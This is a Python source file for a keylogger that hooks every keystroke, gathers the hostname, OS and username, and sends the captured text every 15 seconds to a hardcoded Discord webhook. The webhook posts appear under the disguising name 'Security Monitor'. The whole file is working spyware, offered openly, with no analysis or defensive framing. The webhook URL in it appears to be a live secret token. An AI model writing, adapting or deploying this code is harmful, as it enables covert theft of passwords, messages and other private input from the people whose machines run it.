import keyboard
import time
import requests
import json
import platform
import socket
from threading import Timer
from datetime import datetime

class AdvancedDiscordKeylogger:
    def __init__(self, webhook_url, interval=60, max_log_length=1500):
        self.webhook_url = webhook_url
        self.interval = interval
        self.max_log_length = max_log_length
        self.log = ""
        self.timer = None
        self.start_time = datetime.now()
        self.system_info = self.get_system_info()
        
        # Track shift state for proper capitalization
        self.shift_pressed = False
        self.caps_lock = False

    def get_system_info(self):
        """Get basic system information"""
        return {
            "hostname": socket.gethostname(),
            "platform": platform.system(),
            "processor": platform.processor(),
            "username": platform.node()
        }

    def send_to_discord(self, message, is_final=False):
        """Send data to Discord with enhanced formatting"""
        try:
            embed = {
                "title": "🔑 Keystroke Capture" + (" - FINAL" if is_final else ""),
                "description": f"```{message}```",
                "color": 0x5865F2,
                "timestamp": datetime.now().isoformat(),
                "fields": [
                    {
                        "name": "System Info",
                        "value": f"**Host:** {self.system_info['hostname']}\n**OS:** {self.system_info['platform']}\n**User:** {self.system_info['username']}",
                        "inline": True
                    },
                    {
                        "name": "Session Info", 
                        "value": f"**Duration:** {(datetime.now() - self.start_time).total_seconds():.1f}s\n**Characters:** {len(message)}",
                        "inline": True
                    }
                ],
                "footer": {
                    "text": ""
                }
            }

            payload = {
                "username": "Security Monitor",
                "embeds": [embed]
            }

            headers = {'Content-Type': 'application/json'}
            response = requests.post(self.webhook_url, data=json.dumps(payload), headers=headers)

            return response.status_code == 204

        except Exception as e:
            print(f"Error sending to Discord: {e}")
            return False

    def format_keystrokes(self, text):
        """Format keystrokes for better readability"""
        lines = []
        current_time = datetime.now().strftime('%H:%M:%S')

        if len(text) > self.max_log_length:
            text = f"...{text[-self.max_log_length:]}"

        lines.append(f"Timestamp: {current_time}")
        lines.append("-" * 40)
        lines.append(text)
        lines.append("-" * 40)

        return "\n".join(lines)

    def report(self):
        """Send accumulated keystrokes to Discord"""
        if self.log:
            formatted_log = self.format_keystrokes(self.log)
            success = self.send_to_discord(formatted_log)

            if success:
                self.log = ""
                
        # Reset timer
        self.timer = Timer(self.interval, self.report)
        self.timer.daemon = True
        self.timer.start()

    def get_char_from_event(self, event):
        """Convert keyboard event to actual character"""
        try:
            # Map common scan codes to characters
            scan_to_char = {
                # Numbers row
                18: '1', 19: '2', 20: '3', 21: '4', 23: '5', 
                22: '6', 26: '7', 28: '8', 25: '9', 29: '0',
                
                # Top letter row
                12: 'q', 13: 'w', 14: 'e', 15: 'r', 17: 't',
                16: 'y', 32: 'u', 34: 'i', 31: 'o', 35: 'p',
                
                # Middle letter row  
                0: 'a', 1: 's', 2: 'd', 3: 'f', 5: 'g',
                4: 'h', 38: 'j', 40: 'k', 37: 'l', 41: ';',
                
                # Bottom letter row
                6: 'z', 7: 'x', 8: 'c', 9: 'v', 11: 'b',
                45: 'n', 46: 'm', 43: ',', 47: '.', 44: '/',
                
                # Special characters
                50: '`', 27: '-', 24: '=', 42: '\\', 33: '[', 30: ']', 41: ';', 39: "'",
                
                # Space
                49: ' '
            }
            
            # Shift modified characters
            scan_to_char_shift = {
                18: '!', 19: '@', 20: '#', 21: '$', 23: '%', 
                22: '^', 26: '&', 28: '*', 25: '(', 29: ')',
                50: '~', 27: '_', 24: '+', 42: '|', 33: '{', 30: '}', 41: ':', 39: '"'
            }
            
            if event.scan_code in scan_to_char:
                if self.shift_pressed or self.caps_lock:
                    # Use shift mapping if available, otherwise capitalize
                    if event.scan_code in scan_to_char_shift:
                        return scan_to_char_shift[event.scan_code]
                    else:
                        char = scan_to_char[event.scan_code]
                        if char.isalpha():
                            return char.upper()
                        return char
                else:
                    return scan_to_char[event.scan_code]
            
            return None
                
        except Exception as e:
            print(f"Error converting scan code: {e}")
            return None

    def on_key_event(self, event):
        """Handle key press events"""
        try:
            if event.event_type != keyboard.KEY_DOWN:
                return

            # Handle modifier keys
            if event.name in ['shift', 'left shift', 'right shift']:
                self.shift_pressed = True
                return
            elif event.name == 'caps lock':
                self.caps_lock = not self.caps_lock
                return
            
            # Try to get actual character
            char = self.get_char_from_event(event)
            
            if char:
                self.log += char
                print(f"Captured char: '{char}'")
            else:
                # Handle special keys
                if event.name == 'enter':
                    self.log += '\n'
                    print("Captured: [ENTER]")
                elif event.name == 'tab':
                    self.log += '    '
                    print("Captured: [TAB]")
                elif event.name == 'backspace':
                    if self.log:
                        self.log = self.log[:-1]
                    print("Captured: [BACKSPACE]")
                elif event.name == 'space':
                    self.log += ' '
                    print("Captured: [SPACE]")
                elif event.name and len(event.name) == 1:
                    # If it's already a single character, use it
                    self.log += event.name
                    print(f"Captured char: '{event.name}'")
                else:
                    # Other special keys
                    self.log += f'[{event.name.upper()}]'
                    print(f"Captured: [{event.name.upper()}]")

            # Auto-report if log gets too large
            if len(self.log) > 1000:
                self.report()

        except Exception as e:
            print(f"Error in key handler: {e}")

    def on_key_release(self, event):
        """Handle key release events for modifier keys"""
        try:
            if event.name in ['shift', 'left shift', 'right shift']:
                self.shift_pressed = False
        except:
            pass

    def start(self):
        """Start the keylogger"""
        print(f"Starting advanced keylogger on {self.system_info['hostname']}")
        print(f"Reporting every {self.interval} seconds to Discord")
        print("Type something and check Discord for the captured text!")

        # Send system info first
        system_message = f"Keylogger started on:\nHostname: {self.system_info['hostname']}\nOS: {self.system_info['platform']}\nUser: {self.system_info['username']}"
        self.send_to_discord(system_message)

        self.start_time = datetime.now()

        # Start the reporting timer
        self.timer = Timer(self.interval, self.report)
        self.timer.daemon = True
        self.timer.start()

        # Start listening to both press and release events
        keyboard.on_press(self.on_key_event)
        keyboard.on_release(self.on_key_release)

        print("Keylogger active. Press Ctrl+C to stop.")

    def stop(self):
        """Stop the keylogger and send final report"""
        if self.timer:
            self.timer.cancel()

        # Send final report
        if self.log:
            final_message = self.format_keystrokes(self.log) + "\n\n=== SESSION ENDED ==="
            self.send_to_discord(final_message, is_final=True)

        keyboard.unhook_all()
        print("Keylogger stopped and final report sent.")

# Usage
if __name__ == "__main__":
    # Your Discord webhook URL
    WEBHOOK_URL = "https://discord.com/api/webhooks/1425330581465600102/zuD1p9U0jgJB7UBeLBhfSCswTKYl44mnmEZfWknueSP7BIWqEd8DWDUj4J2yje_m3Df9"

    keylogger = AdvancedDiscordKeylogger(
        webhook_url=WEBHOOK_URL,
        interval=15,
        max_log_length=1500
    )

    try:
        keylogger.start()
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\nStopping keylogger...")
        keylogger.stop()
